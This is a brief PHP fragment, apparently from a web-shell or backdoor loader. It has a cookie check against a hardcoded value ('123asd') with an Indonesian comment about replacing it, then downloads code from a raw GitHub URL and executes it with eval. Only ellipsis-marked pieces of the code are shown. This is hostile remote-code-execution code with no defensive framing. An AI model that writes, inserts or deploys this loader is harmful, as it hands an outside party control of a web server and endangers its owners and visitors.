...
{
    return isset($_COOKIE['123asd']) && $_COOKIE['123asd'] === '123asd'; // Ganti 'user123' dengan nilai yang sesuai
}
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/boyas2/aboyas/refs/heads/main/gekologin');
    eval('?>' . $a);
